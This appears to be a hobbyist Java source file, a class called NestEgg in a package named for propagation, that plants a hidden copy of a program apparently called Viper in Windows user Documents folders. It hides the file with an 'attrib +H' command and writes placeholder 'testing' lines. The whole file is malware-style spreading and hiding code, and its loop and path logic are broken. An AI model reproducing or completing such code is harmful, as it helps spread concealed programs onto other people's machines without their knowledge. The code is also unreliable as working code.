package propogartion;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public class NestEgg {
	static String[] inCoded= {"testing","testing","testing"};
public static void labEgg(Path vPath){
	File users= new File("C:/Users");
	File[] targetUsers = users.listFiles();
	for(int x =0; x<targetUsers.length;x++){
		createCopy(createFilePath(users.getAbsolutePath()),vPath);
	}

}
public static String createFilePath(String userPath){
	File uP=new File(userPath+"/Documents/vn");
	if(uP.exists()==false){
		try {
			uP.createNewFile();
		} catch (IOException e) {
			System.out.println("interfearence");
			e.printStackTrace();
		}
		
	}
	if(uP.isHidden()==false){
		
		try {
			Runtime.getRuntime().exec("attrib +H "+uP.getAbsolutePath());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	return uP.getAbsolutePath() ;
	
}
public static void createCopy(String filePath,Path vPath){
	File nestLocation=new File(filePath);
	try{
		 
		
		 
		
		
		
			
		 if(!nestLocation.exists()){
			 nestLocation.createNewFile();
		 
		
		
		 FileWriter fw= new FileWriter(nestLocation.getAbsolutePath());
		BufferedWriter writing= new BufferedWriter(fw);
	
		
		
	   for(int x=0;x<inCoded.length; x++){
		writing.write(inCoded[x]);
		writing.newLine();
		}
	    writing.close();
		 }
		 }
		 catch(IOException e){
		 System.out.println( "Error: "+ e.toString());
		 }
	try {
		File vF=new File(filePath+"/Viper.java");
		if(vF.exists()==false){
		Files.copy(vPath, nestLocation.toPath(), StandardCopyOption.REPLACE_EXISTING);
		}
	} catch (IOException e) {
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

}
}
